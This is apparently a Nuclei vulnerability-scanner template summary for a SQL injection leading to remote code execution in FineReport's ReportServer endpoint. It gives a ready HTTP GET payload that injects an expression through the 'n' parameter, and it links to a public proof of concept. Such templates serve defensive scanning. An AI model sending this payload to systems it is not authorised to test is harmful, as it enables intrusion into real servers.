# Nuclei Template: FineReport SQLi - Remote Code Execution
**Template ID:** finereport-sqli-rce
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**Source:** Nuclei Template (`finereport-sqli-rce.yaml`)

## Vulnerability Information & PoC

## Description
Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.

## Steps to reproduce / Exploit Payload
```http
GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,123)} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

## References
- https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
